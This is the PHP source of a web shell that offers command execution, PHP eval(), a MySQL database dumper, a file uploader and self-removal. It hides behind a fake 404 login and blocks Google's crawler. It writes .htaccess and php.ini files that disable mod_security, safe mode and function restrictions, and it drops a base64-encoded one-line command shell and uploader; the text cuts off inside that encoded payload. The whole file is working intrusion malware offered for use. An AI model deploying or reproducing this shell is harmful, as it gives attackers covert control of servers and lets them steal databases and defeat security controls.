<?php
//Keep Google from finding our shell
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { 
    header('HTTP/1.0 404 Not Found'); 
    exit; 
} 
//Current Version of HoodedRob1n's Simple Shell
$hrver = "v1.0 PRIv8 Beta";
$self = $_SERVER['PHP_SELF'];
//simple authentication page
//authentication password
$admin_pass = 'Sup3rS3cr3t';

//start
session_start();
$is_admin = false;

//auth check
if ((@$_SESSION['adminpass'] === md5($admin_pass)) or (@$_POST['password'] == $admin_pass)) {
        $is_admin = true;
        $_SESSION['adminpass'] = md5($admin_pass);
}
if (isset($_POST['logout'])) {
    alert("Cee U L8r Alig8r :p");
    $is_admin = false;
    unset ($_SESSION['adminpass']); 
    // we'll clear the adminpass session variable to logout user properly but we keep any other settings :)
}
if ($is_admin !== true) { 
/*   bad password if is_admin returns false at this point so let them know    */
    if (isset($_POST['password'])) {
        alert("Get Lost Fucker");
        die('<br /><br /><br /><big><strong><center><blink>Epic Failure!</blink></center></strong></big>');
}
/*   no password entered  */

//password form setup for actual login screen which will present the fake 404 error message with login found centered on page
echo "<head><title>HR's Simple Shell Login</title></head>";
echo "<h1>Not Found</h1>";
echo "<p>The requested URL was not found on this server.</p><hr />";
echo "<address>Apache Server at " . $_SERVER['HTTP_HOST'] . " Port 80</address>";
echo "<style> input { margin:0;background-color:#fff;border:1px solid #fff; } </style>";
echo "<center>";
echo "<form name='adminform' method='post' action='$self'>";
echo "<input type='password' size='42' name='password' value=''></form></center>";
echo "</center>";
die();
}



//establish global variables
$self = $_SERVER["PHP_SELF"];
$selfscript = $_SERVER["SCRIPT_NAME"];
$page = (isset($_GET['page']) ? $_GET['page'] : 'home');
$ip = $_SERVER['SERVER_ADDR'];
$remote_ip = $_SERVER['REMOTE_ADDR'];
$host = $_SERVER['HTTP_HOST'];
$srvsw = php_uname();
$srvname = $_SERVER['SERVER_NAME'];
$os = "Unknown";
$slash     = '/'; // Default Directory separator


//CREATE AN ALERT() FUNCTION - will js alert what ever value you give the variable $text at the time it is "alert(called)"
//this is just function creation, call it later how you want and with $text defined as needed for the moment....
function alert($text){
echo "<script>alert('".$text."')</script>";
}


//Determine OS as Winblows or *nix based - and if Winblows reset the slash directory separator to \\ so we can play nice with Winblows naming conventions
if(stristr(php_uname(),"Windows"))
{
        $slash = '\\';
        $os = "Windblows";
}
else if(stristr(php_uname(),"Linux"))
{
        $os = "Linux";
}

//check for SAFE MODE
if(ini_get('safe_mode')){
$safechk="<font color='red'>On</font>";
}else{
$safechk="<font color='green'>Off</font>";
}

//check what functions are available 
if(ini_get('disable_functions')){
$availablef=ini_get('disable_functions');
}else{
$availablef="All Functions Enabled";
}

//determine method for executing commands:
if( is_callable("system")) { $selfthod = "system"; } elseif
  ( is_callable("passthru")) { $selfthod = "passthru"; } elseif
  ( is_callable("exec")) { $selfthod = "exec"; } elseif
  (($btres = `ls -a`) != FALSE) { $selfthod = "backticks"; }
  else { $selfthod = "fail"; }

//function to help us properly return the size results in readable form  
function sizee($size)
{
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}


//Check registered globals, ability to use cURL, and a final check to see which Database Managent System or DBMS are in use or available (checks for MySQL, MS-SQL, PostgresSQL, and Oracle)
if(ini_get('register_globals')){
$registerg="Enabled";
}else{
$registerg="Disabled";
}
if(extension_loaded('curl')){
$curls="<font color='green'>Enabled</font>";
}else{
$curls="<font color='red'>Disabled</font>";
}
if(@function_exists('mysql_connect')){
$db_on = "<font color='blue'>Mysql: </font><font color='green'>On</font>";
};
if(@function_exists('mssql_connect')){
$db_on = "<font color='blue'>Mssql: </font><font color='green'>On</font>";
};
if(@function_exists('pg_connect')){
$db_on = "<font color='blue'>PostgreSQL: </font><font color='green'>On</font>";
};
if(@function_exists('ocilogon')){
$db_on = "<font color='blue'>Oracle: </font><font color='green'>On</font>";
};

//Start Svisual part
echo "<title>HR's Simple Shell</title>";
echo "<center>";
echo "<font color='#E41B17' face='Webdings' size='6'>~</font>";
echo "<font color='#F62217' face='Webdings' size='6'>~</font>";
echo "<font color='red' face='Webdings' size='6'>~</font>";
echo "<font color='red' face='Courier New' size='5'>";
echo "<marquee behavior='scroll' direction='left' scrollamount='2'  width='26%'>";
echo "<span class='footerlink'><b>Welcome to Hood3dRob1n's Simple Shell</b></span>";
echo "</marquee>";
echo "</font>";
echo "<font color='red' face='Webdings' size='6'>~</font>";
echo "<font color='#F62217' face='Webdings' size='6'>~</font>";
echo "<font color='#E41B17' face='Webdings' size='6'>~</font>";
echo "</center>";

//TOOL LINKS
//using tables again to keep it clean since I dont have CSS :(
echo "<a name='quicklinks'></a>";
echo "<center><table width='100%' border='1' cellpadding='0'><tr>";
echo "<th colspan='13'><center><b><font color='red'> QUICK LINKS: </font></b></center></th></tr><tr>";
echo "<td><center><form name='home' action='?page=home' method='get' style='margin-bottom:0;'><input type='submit' value='HOME'></form></center></td>";
echo "<td><center><form name='cmd' action=#command method='get' style='margin-bottom:0;'><input type='submit' value='CMD'></form></center></td>";
echo "<td><center><form name='fwriter' action=#fcreator method='get' style='margin-bottom:0;'><input type='submit' value='FILE WRITER'></form></center></td>";
echo "<td><center><form name='symlinker' action=#symlink method='get' style='margin-bottom:0;'><input type='submit' value='SYMLINKER'></form></center></td>";
echo "<td><center><form name='uploader' action=#uploader method='get' style='margin-bottom:0;'><input type='submit' value='UPLOADER'></form></center></td>";
echo "<td><center><form name='phpeval' action=#phpeval method='get' style='margin-bottom:0;'><input type='submit' value='PHP EVAL()'></form></center></td>";
echo "<td><center><form name='phpeval' action=#sfbypass_tools method='get' style='margin-bottom:0;'><input type='submit' value='BYPASS TOOLS'></form></center></td>";
//NOTE: form and url encoding seems to mess up these two which work as hyperlinks so instead of recoding the form to include hidden fields with set values we will use type=button and onlick to get the same result as the form buttons used elsewhere. This allows us to hide the phpinfo() results which take up a huge amount of space and to keep SQL tools separate so they dont get clagged with all the other data and tools (My preference)
echo "<td><center><input type='button' onclick=\"location.href='?page=dump';\" value='MySQL DB Dumper'/></center></td>";
echo "<td><center><input type='button' onclick=\"location.href='?page=pinfo';\" value='PHPINFO()'/></center></td>";
echo "<td><center><form name='logout' action='$self' method='post' style='margin-bottom:0;'><input type='submit' value='Logout This Bitch' name='logout'></form></td>";
echo "<td><center><form name='selfremove' action='?page=removal' method='get' style='margin-bottom:0;'><input type='submit' value='SELF REMOVAL'></form></center></td>"; //Need to press this button twice to take full affect...
echo "</tr></table></center>";
//End Tool Links
echo "<hr />";

//Floating Arrow to allow users to return to top of page easily
echo "<a style='display:scroll;position:fixed;bottom:5px;right:5px;' href='#' title='2theTOP'><img src='http://i.imgur.com/JKt0k.jpg'/></a>";

//Display Basic Info about the system
//use tables to make things fit pretty like on either side of the page with a single line
//have to use tables without any CSS :(
// dont forget to moev the </table> if you add more touch up to this section, also watch line breaks and table row/data endings which can mess up formatting
echo "<table width='100%' border='1'><tr><th colspan='2'><center><b><font color='red'> SYSTEM INFO </font></b></center></th></tr><tr>";
echo "<td align='left'><b>HR's Simple Shell: <font color='red'>" . $hrver . "</font></b></td>";
echo "<td align='right'><b><font color='green'>" . $remote_ip . "</font>:Your IP?</b></td></tr>";
echo "<td align='left'><b>System Type: <font color='red'>" . $os . "</font></b>";
echo "<td align='right'><b><font color='red'>" . $ip . "</font>:Server IP</b></td></tr>";
echo "<td align='left'><b>OS Details: <font color='red'>" . $srvsw . "</font></b>";
echo "<td align='right'><b><font color='red'>" . $srvname . "</font>:Server Name</b></td></tr>";
echo "<td align='left'><b>Total Space: <font color='red'>" . sizee(disk_total_space("/")) . "</font></b>";
echo "<td align='right'><b><font color='red'>" . $host . "</font>:Host</b></td></tr>";
echo "<td align='left'><b>Free Space: <font color='red'>" . sizee(disk_free_space("/")) . "</font></b>";
echo "<td align='right'><b><font color='red'>" . $_SERVER['SERVER_ADMIN'] . "</font>:Server Admin</b></td></tr>";
echo "<td align='left'><b>Register_Globals: <font color='red'>" . $registerg . "</font></b>";
echo "<td align='right'><b><font color='red'>" . $availablef . "</font>:Functions Available</b></td></tr>";
echo "<td align='left'><b>Safe_Mode: <font color='red'>" . $safechk . "</font></b>";
echo "<td align='right'><b><font color='red'>" . $curls . "</font>:Curl Enabled</b></td></tr>";
echo "<td align='left'><b>PHP: <font color='red'>" . phpversion() . "</font></b>";
echo "<td align='right'><b><font color='red'>" . $db_on . "</font>:Database Options</b></td></tr>";
echo "<td align='left'><b>Current Directory: <font color='red'>" . getcwd() . "</font></b>";
echo "<td align='right'><b><font color='red'>" . "TBD..." . "</font>:Available Drives</b></td></tr>";

echo "</table>";
echo "<hr />";
//end info section


//Handle GET Requests generated by the Links section (also allows us to hide a few sections unless clicked on :)
//SELF REMOVAL
//We use unlink() to remove the current file ($_Server['Script_Name']) and we build the path with getcwd() and our $slash variable from beginning
if( $page == 'removal'){
unlink(getcwd().$slash.$_SERVER["SCRIPT_NAME"]);
}
//simple as that

//handle request for phpinfo()
if( $page == 'pinfo'){
    echo "<br /><center><b><font color='red'> Results for phpinfo()... </font></b></center><br />";
    phpinfo();
    echo "<br />";
    echo "<hr />";
}
//end PHPINFO() Tool


//MySQL DB DUMPER TOOL
if ($page == "dump"){
    //echo $head;
    echo '<p align="center">';
    echo '<table border=1 width=400 style="border-collapse: collapse"  bordercolor=#C6C6C6 cellpadding=2><tr><td width=400 colspan=2 bgcolor=#F2F2F2><p align=center><b><font face=Arial size=2 color=#433934>Backup Database</font></b></td></tr><tr><td width=150 bgcolor=#EAEAEA><font face=Arial size=2>DB Type:</font></td><td width=250 bgcolor=#EAEAEA><form method=post action="'.$_SERVER['PHP_SELF'].'"><select name=method><option value="gzip">Gzip</option><option value="sql">Sql</option> </select></td></tr><tr><td width=150 bgcolor=#EAEAEA><font face=Arial size=2>Server:</font></td><td width=250 bgcolor=#EAEAEA><input type=text name=server size=35></td></tr><tr><td width=150 bgcolor=#EAEAEA><font face=Arial size=2>Username:</font></td><td width=250 bgcolor=#EAEAEA><input type=text name=username size=35></td></tr><tr><td width=150 bgcolor=#EAEAEA><font face=Arial size=2>Password:</font></td><td width=250 bgcolor=#EAEAEA><input type=text name=password></td></tr><tr><td width=150 bgcolor=#EAEAEA><font face=Arial size=2>Data Base Name:</font></td><td width=250 bgcolor=#EAEAEA><input type=text name=dbname></td></tr><tr><td width=400 colspan=2 bgcolor=#EAEAEA><center><input type=submit value="  Dump!  " ></td></tr></table></form></center></table><br /><br /><center><FORM METHOD="get" ACTION="?page=home"><INPUT     TYPE="submit" VALUE="RETURN HOME"></FORM></center>';
    //echo $end;
    exit;
}
//take details from form above and now use them to work the MySQL magic
if (isset($_POST['username']) && isset($_POST['dbname']) && isset($_POST['method'])){
    $date = date("Y-m-d");
    $dbserver = $_POST['server'];
    $dbuser = $_POST['username'];
    $dbpass = $_POST['password'];
    $dbname = $_POST['dbname'];
    $file = "Dump-$dbname-$date";
    $method = $_POST['method'];
    if ($method=='sql'){
        $file="Dump-$dbname-$date.sql";
        $fp=fopen($file,"w");
    }else{
        $file="Dump-$dbname-$date.sql.gz";
        $fp = gzopen($file,"w");
    }

    function write($data, $fp) {
        
        if ($_POST['method']=='sql'){
            if(!@fwrite($fp,$data))
            {
                echo "<br /> Failed to write. Expects parameter 1 to be resource, received boolean";
            }
        }else{
            if(!@gzwrite($fp, $data))
            {
                echo "<br />Failed to write: Permission Denied!<br />";
            }
        }
    }
    
    mysql_connect ($dbserver, $dbuser, $dbpass);
    mysql_select_db($dbname);
    $tables = mysql_query ("SHOW TABLES");
    while ($i = mysql_fetch_array($tables)) {
        $i = $i['Tables_in_'.$dbname];
        $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
        write($create['Create Table'].";\n\n");
        $sql = mysql_query ("SELECT * FROM ".$i);
        if (mysql_num_rows($sql)) {
            while ($row = mysql_fetch_row($sql)) {
                foreach ($row as $j => $k) {
                    $row[$j] = "'".mysql_escape_string($k)."'";
                }
                write("INSERT INTO $i VALUES(".implode(",", $row).");\n", $fp);
            }
        }
    }
    if ($method=='sql'){
        fclose ($fp);
    }else{
        if(!@gzclose($fp))
        {
            echo "<br /> Failed to gzclose, gave it a boolean value and it expects a resource";
        }
    }
    header("Content-Disposition: attachment; filename=" . $file);   
    header("Content-Type: application/download");
    header("Content-Length: " . filesize($file));
    flush();

    $fp = fopen($file, "r");
    while (!feof($fp))
    {
        if(gettype($fp) == "boolean")
        {
            break;
        }
        echo fread($fp, 65536);
        flush();
    } 
    fclose($fp); 
}

//UPGRADE TO THIS EVENTUALLY:

//Hanndle for MySQL DB DUMPER Tool
//SQL DUMPER, slightly borrowed from ITSecTeam
if( $page == "sqlDUMP")
{
//use tables again to keep formatting pretty, build forms within the table structure :p
    echo "<center><table width='100%' border='1'>";
    echo "<tr><th colspan='1' ><center><b><font color='red'> MySQL DATABASE DUMPER </font><b><br /><br /><sub><font color='grey'> Please choose desired file format for DB dump, provide proper credentials to make connection, and hit the DUMP button...Enjoy!</sub></font></center></th></tr>";
    echo "<tr><td><center><form action='$self' method='post'>";
    echo "<center><input type='radio' name='sqlmeth' value='1' /><b><font color='red'> Dump Database to .SQL file format </b></font></center><br />";
    echo "<center><input type-'radio' name='sqlmeth' value='2' /><b><font color='red'> Dump Database to .GZIP file format </b></font></center></td></tr>";
    echo "<tr><td><cemter><font color='red'>Server: </font></td><td><input type='text' name='sqlserver' size='50' value'localhost'></center></td></tr>";
    echo "<tr><td><center><font color='red'>Database Username: </font></td><td><input type='text' name='sqluser' size='50'></center></td></tr>";
    echo "<tr><td><center><font color='red'>Database Password: </font></td><td><input type='text' name='sqlpass' size='50'></center></td></tr>";
    echo "<tr><td><center><font color='red'>Database Name: </font></td><td><input type='text' name='sqldb' size='50'></center></td></tr>";
    echo "<tr><td><center><input type='submit' value='Dump That Shit!'></td></tr>";
    echo "</table></center><br /><hr />";
}
//handle the requests made by the forms in the above which will affect the paramets passed to the MySQL connect & dump script below
//If all methods are provided
if (isset($_POST['sqluser']) && isset($_POST['sqldb']) && isset($_POST['sqlmeth']))
{
    //establish a few variables based on arguments passed from forms
    $dbsrvr = $_POST['sqlserver'];
    $dbusr = $_POST['sqluser'];
    $dbpasswd = $_POST['sqlpass'];
    $dbname = $_POST['sqldb'];
    $file = "$dbname-DUMPED";
    $method = $_POST['sqlmeth'];
    //if SQL make .SQL file else write a .sql.gz file format
    if ($method=='sql'){
        $file="$dbname-DUMPED.sql";
        $fp=fopen($file,"w");
    }else{
        $file="$dbname-DUMPED.sql.gz";
        $fp = gzopen($file,"w");
    }
//create and define our custom function write() which handles the actual file writing function based on user decision made, either fwrite() for .sql or gzwrite() for .sql.gz
    function write($data) 
    {
        global $fp;
        if ($_POST['sqlmeth']=='sql'){
            fwrite($fp,$data);
        }else{
            gzwrite($fp, $data);
        }
    }
    //establish connection to mysql database based upon the credentials set based on user provided info from forms
    mysql_connect ($dbsrvr, $dbusr, $dbpasswd);
    //select the user defined database by dbName so we can then execute commands against the specified DB
    mysql_select_db($dbname);
    //establish the results of the SHOW TABLES mysql command as a variable $tables
    $tables = mysql_query ("SHOW TABLES");
    //we enumerate each table and using our custom function write() we write the returned $data to our $file...
    //we create an array out of the available tables, then use mysql commands to find the commands to create the tables themselves (i.e. columns and data types), then we enumerate all entries from each table which is now a variable in our "i" array which is made of the table names. Then as long as rows return we loop though and write all of the entries to our file using method defined in form (either .sql or .sql.gz)
    while ($i = mysql_fetch_array($tables)) 
    {
        $i = $i['Tables_in_'.$dbname];
        $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
        write($create['Create Table'].";\n\n");
        $sql = mysql_query ("SELECT * FROM ".$i);
        if (mysql_num_rows($sql)) {
            while ($row = mysql_fetch_row($sql)) 
            {
                foreach ($row as $j => $k) 
                {
                    $row[$j] = "'".mysql_escape_string($k)."'";
                }
                write("INSERT INTO $i VALUES(".implode(",", $row).");\n");
            }
        }
    }
    //close out our file writes appropriately to avoid issues and clean up
    if ($method=='sql')
    {
        fclose ($fp);
    }
    else
    {
        gzclose($fp);
    }
    header("Content-Disposition: attachment; filename=" . $file);   
    header("Content-Type: application/download");
    header("Content-Length: " . filesize($file));
    flush();

    $fp = fopen($file, "r");
    while (!feof($fp))
    {
        echo fread($fp, 65536);
        flush();
    } 
    fclose($fp); 
}

//END DB DUMPER TOOL
echo "<br />";
echo "<hr />";
//End of Tool and HIdden Features available by link only

//End DB DUmper Tool



//Start Visual Area BElow Links
// create our form for user to submit commands through
echo "<center><a name='command'><font color='red'><b>COMMAND EXECUTION</b></font></a><br />";
echo "<form method='post' action='$self'><br />";
echo "<b><font color='red'>Enter Command to Execute: </font></b> <input type='text' size='70%' AUTOFOCUS name='cmd'> <input type='submit' value='Execute Command!'>";
echo "</form>";
echo "<sub><font color='grey'>Since we are passing comamnds you wont change directories so chain commands together using the double ampersand sign '&&' and you should be able to then get and do anything you want :)</font></sub><br />";
echo "<textarea style='color:red' rows=15 cols=100>";
  
 //Exectue commands
if(isset($_POST['cmd']))
{
    $cmd = $_POST['cmd'];
    switch($selfthod)
    {
        case "system":
            system($cmd);
            break;
        case "passthru":
            passthru($cmd);
            break;
        case "exec":
            exec($cmd);
            break;
        case "backticks":
            $execmd = `$cmd`;
            echo $execmd;
            break;
        case "fail":
            echo "Epic Failure!";
            break;
    }
 //Possible replacement to switch method above for executing commands as not sure if this is actually working or not
 //would also require removing the check at top of page as well as this is standalone based $cmd variable passing content and check being run withoutput displayed
 /*
 global $disablefunc;
 $result = "";
 if (!empty($cmd))
 {
  if (is_callable("exec") and !in_array("exec",$disablefunc)) {exec($cmd,$result); $result = join("\n",$result);}
  elseif (($result = `$cmd`) !== FALSE) {}
  elseif (is_callable("system") and !in_array("system",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_resource($fp = popen($cmd,"r")))
  {
   $result = "";
   while(!feof($fp)) {$result .= fread($fp,1024);}
   pclose($fp);
  }
 }
 */
}
echo "</textarea></center><br />";
//End COMMAND EXECUTION tool
echo "<br />";
echo "<hr />";



//handle request for EVAL()
echo "<a name='phpeval'></a>";
echo "<br /><center><b><font color='red'> PHP EVAL() </font></b></center>";
echo "<br /><center><b><font color='grey'><sub> Please enter your PHP code below without start or end tags and submit to execute </sub></font></b></center><br />";

//create form for user to submit code through
print "<center><form action='?page=eval' method='post'><textarea cols=60 rows=10 name='eval'>";

//we set it with a basic command to test usage and show funcionailty for first time users - it prints "Testing..Testing....Testing-1-2-3" ;)
//user can replace with their own code and do as they like, this is just a place holder to provide an example...
//if its set then print it if not then insert our preset simple print command in text area to show example
if(isset($_POST['eval']))
{
print htmlspecialchars($_POST['eval']);
} else {
print "print 'Testing..Testing...Testing-1-2-3';";
}
//close text area and create submit button
print "</textarea><br><input type=submit value='Eval Your Code'></form><br />";
echo "<b><sub><font color='grey'>Your code will be executed upon submission via the PHP eval() funtion. If results are returned then they will be displayed below...</font></sub></b><br /><br />";

//if we get the submit posting the user supllied eval code we will then execute it via the PHP eval() function
//allows for quick and dirty PHP execution & scripting for whatever you may want to use it for
if(isset($_POST['eval']))
{
print "<b><font color='red'> Output: </font><b>";
print "<br /><font color='green'>";

eval($_POST['eval']);
}
//end EVAL() Tool
echo "</font><br /></center>";
echo "<hr />";
//end tool

//start FILE BUILDER tool
echo "<table width='100%' border='1'>";
echo "<th><center><a name='fcreator'><b><font color='red'> FILE CREATOR </font></a></b></th>";
echo "<tr>";
echo "<td>";
echo "<br /><center><b><font color='grey'>Please select which file you would like to create:</font><b></center>";
//Now we lay out the radio buttons for our form so the user can select which .htaccess file they want to create
echo "<center><form action='$self' method='post'>";
echo "<select name='htmeth'>";
echo "<label><b><font color='grey'>Please select which file you would like to create:</font><b></label>";
echo "<option value='1' selected='selected'><b><font color='red'>Simple .htaccess to enable symlinks and indexing</font></b></option>";
echo "<option value='2'><b><font color='red'>HR's Custom .htaccess file</font></b></option>";
echo "<option value='3'><b><font color='red'>Simple .htaccess to turn off Mod Security</font></b></option>";
echo "<option value='4'><b><font color='red'>Write PHP.ini File to Turn Safe Mode OFF and Enable All Functions in Current Directory</font></b></option>";
echo "<option value='5'><b><font color='red'>Write Simple Command Shell to directory below</font></b></option>";
echo "<option value='6'><b><font color='red'>Write an uploader page to the directory below</font></b></option>";
echo "</select>";
echo "<input type='submit' name='submit' value='Create File'/>";
echo "</form></center>";
echo "<center><font color='grey'><b>NOTE:</b> The simple .htaccess file will work in most cases for symlinking, but if you plan to use additional CGI tools you might want to use the full option</font></center><br />";

//set our content for our two .htaccess files
$htopt1 = "Options +Indexes +FollowSymLinks\n\nDirectoryIndex lulz.htm";
$htopt2 = "Options +Indexes +MultiViews +FollowSymLinks -SymLinksIfOwnerMatch +ExecCGI\n\nDirectoryIndex index.html index.php index.htm\n\n<IfModule mod_autoindex.c>\n IndexOptions FancyIndexing IconHeight=16 IconWidth=16\n</IfModule>\n\n<FilesMatch '\.(php|php5|phtml)$'>\n SetHandler application/x-http-php\n</FileMatch\n\n<FilesMatch '\.(pl|cgi|cc|izri)$'>\n SetHandler application/x-http-cgi\n</FileMatch\n\nRewriteEngine on\nRewriteRule (.*) index.php";
$htopt3 = "<IfModule mod_security.c>\n    Sec------Engine Off\n    Sec------ScanPOST Off\n</IfModule>\n";
$htopt4 = "safe_mode=OFF \n disable_functions=NONE \n";

//handle user input on choice of .htaccess file to write and write accordingly (options outlined above)
if(isset($_POST['htmeth']) && $_POST['htmeth'] == '1')
{
    $htfile = getcwd() . $slash . ".htaccess";
    $HT1=fopen(".htaccess","w");
    fwrite($HT1,$htopt1,strlen($htopt1));
    fclose($HT1);
    
    //tell them to check manually to confirm it was created, maybe in future will automate this step...
    echo "<center><b><font color='red'>Check current directory to confirm .htaccess file was properly created: </font><font color='green'>" . getcwd() . $slash .  ".htaccess</b></font></center><br />";
}        
if(isset($_POST['htmeth']) && $_POST['htmeth'] == '2')
{
    $htfile = getcwd() . $slash . ".htaccess";
    $HT2=fopen(".htaccess","w");
    fwrite($HT2,$htopt2,strlen($htopt2));
    fclose($HT2);
    
    //tell them to check manually to confirm it was created, maybe in future will automate this step...
    echo "<center><b><font color='red'>Check current directory to confirm .htaccess file was properly created: </font><font color='green'>" . getcwd() . $slash .  ".htaccess</b></font></center><br />";
}    
if(isset($_POST['htmeth']) && $_POST['htmeth'] == '3')
{
    $htfile = getcwd() . $slash . ".htaccess";
    $HT3=fopen(".htaccess","w");
    fwrite($HT3,$htopt3,strlen($htopt3));
    fclose($HT3);
    
    //tell them to check manually to confirm it was created, maybe in future will automate this step...
    echo "<center><b><font color='red'>Check current directory to confirm .htaccess file was properly created: </font><font color='green'>" . getcwd() . $slash .  ".htaccess</b></font></center><br />";
}        
if(isset($_POST['htmeth']) && $_POST['htmeth'] == '4')
{
    $htfile = getcwd() . $slash . ".htaccess";
    $HT4=fopen("php.ini","w");
    fwrite($HT4,$htopt4,strlen($htopt4));
    fclose($HT4);
    
    //tell them to check manually to confirm it was created, maybe in future will automate this step...
    echo "<center><b><font color='red'>Check current directory to confirm PHP.INI file was properly created: </font><font color='green'>" . getcwd() . $slash .  "php.ini</b></font></center><br />";
}
//set our content for our SHELL & UPLOADER files
//SHELL = simple passthru($_GET['cmd']) shell
$fopt1 = "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+";
//Zer0Lulz uploader script
$fopt2 = "PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFsLy9F?TiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXRyYW5zaXRpb25hbC5kdGQi?Pgo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+CjxoZWFkPgogICA8bWV0?YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYt?OCIgLz4KICAgPHRpdGxlPlplcjBMdWx6IFVwbG9hZGVyPC90aXRsZT4KICAgPGxpbmsgaHJlZj0ic3R5?bGUvc3R5bGUuY3NzIiByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3NzIiAvPgo8L2hlYWQ+Cgo8?Ym9keSBiZ2NvbG9yPSJCbGFjayIgbGluaz0iIzAwRkYwMCIgYWxpbms9IiMxOEI4MjYiIHZsaW5rPSIj?ODRGRjAwIiBmb250IGNvbG9yPSIwMEZGMDAiPgo8U1RZTEU+CmlucHV0ewpiYWNrZ3JvdW5kLWNvbG9y?OiAjMDBGRjAwOwp9CjwvU1RZTEU+Cjw/cGhwCiAgICAkbXlVcGxvYWQgPSBuZXcgbWF4VXBsb2FkKCk7IAogICAgLy8kbXlVcGxvYWQtPnNldFVw?bG9hZExvY2F0aW9uKGdldGN3ZCgpLkRJUkVDVE9SWV9TRVBBUkFUT1IpOwogICAgJG15VXBsb2FkLT51?cGxvYWRGaWxlKCk7Cj8+Cjw/cGhwCi8qKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqCiAqIFpl?cjBMdWx6IFVwbG9hZGVyCiAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq?KioqKioqKioqLwpjbGFzcyBtYXhVcGxvYWR7CiAgICB2YXIgJHVwbG9hZExvY2F0aW9uOwogICAgCiAg?ICBmdW5jdGlvbiBtYXhVcGxvYWQoKXsKICAgICAgICAkdGhpcy0+dXBsb2FkTG9jYXRpb24gPSBnZXRj?d2QoKS5ESVJFQ1RPUllfU0VQQVJBVE9SOwogICAgfQoKICAgIGZ1bmN0aW9uIHNldFVwbG9hZExvY2F0?aW9uKCRkaXIpewogICAgICAgICR0aGlzLT51cGxvYWRMb2NhdGlvbiA9ICRkaXI7CiAgICB9CiAgICAK?ICAgIGZ1bmN0aW9uIHNob3dVcGxvYWRGb3JtKCRtc2c9JycsJGVycm9yPScnKXsKPz4KCQkJPGJyPgoJ?CQk8YnI+CgkJCTxjZW50ZXI+PGZvbnQgY29sb3I9IjAwRkYwMCI+ICArLSstKy0rLSstKy0rLSstKyAr?LSstKy0rLSstKy0rLSstKwogIHxafGV8cnwwfEx8dXxsfHp8IHxVfHB8bHxvfGF8ZHxlfHJ8CiAgKy0r?LSstKy0rLSstKy0rLSsgKy0rLSstKy0rLSstKy0rLSs8L2ZvbnQ+PC9jZW50ZXI+CgkJCTxicj4KCQkJ?PGJyPgo8P3BocAppZiAoJG1zZyAhPSAnJyl7CiAgICBlY2hvICc8cCBjbGFzcz0ibXNnIj4nLiRtc2cu?JzwvcD4nOwp9IGVsc2UgaWYgKCRlcnJvciAhPSAnJyl7CiAgICBlY2hvICc8cCBjbGFzcz0iZW1zZyI+?Jy4kZXJyb3IuJzwvcD4nOwoKfQo/PgogICAgICAgICAgICAgICAgPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVs?dGlwYXJ0L2Zvcm0tZGF0YSIgPgogICAgICAgICAgICAgICAgICAgICA8Y2VudGVyPgogICAgICAgICAg?ICAgICAgICAgICAgICAgPGxhYmVsPjxmb250IGNvbG9yPSIwMEZGMDAiPiBQaWNrIFlvdXIgUG9pc29u?OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBuYW1lPSJteWZpbGUiIHR5cGU9ImZp?bGUiIHNpemU9IjMwIiAvPjwvZm9udD4KICAgICAgICAgICAgICAgICAgICAgICAgIDwvbGFiZWw+CiAg?ICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWw+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAg?PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0QnRuIiBjbGFzcz0ic2J0biIgdmFsdWU9IlVw?bG9hZCB0aGF0IHNoaXQhIiAvPgogICAgICAgICAgICAgICAgICAgICAgICAgPC9sYWJlbD4KICAgICAg?ICAgICAgICAgICAgICAgPC9jZW50ZXI+CiAgICAgICAgICAgICAgICAgPC9mb3JtPgogICAgICAgICAg?ICAgPC9kaXY+CgkJCSA8YnI+CgkJCSA8YnI+CiAgICAgICAgICAgICA8Y2VudGVyPjxkaXYgaWQ9ImZv?b3RlciI+PGEgaHJlZj0iaHR0cDovL3QwLmdzdGF0aWMuY29tL2ltYWdlcz9xPXRibjpBTmQ5R2NSeFhv?WmZHc2lOWUh5MGp2X1pkTjRwUDBubkgyc3lyTV9rNGpiRDF4MEViNGo4WDhiR0dRIiB0YXJnZXQ9Il9i?bGFuayI+WmVyMEx1bHogVXBsb2FkZXI8L2E+PC9kaXY+PC9jZW50ZXI+CiAgICAgICAgIDwvZGl2PgoJ?CSAKPD9waHAKICAgIH0KCiAgICBmdW5jdGlvbiB1cGxvYWRGaWxlKCl7CiAgICAgICAgaWYgKCFpc3Nl?dCgkX1BPU1RbJ3N1Ym1pdEJ0biddKSl7CiAgICAgICAgICAgICR0aGlzLT5zaG93VXBsb2FkRm9ybSgp?OwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRtc2cgPSAnJzsKICAgICAgICAgICAgJGVycm9y?ID0gJyc7CiAgICAgICAgICAgIAogICAgICAgICAgICBpZiAoIWZpbGVfZX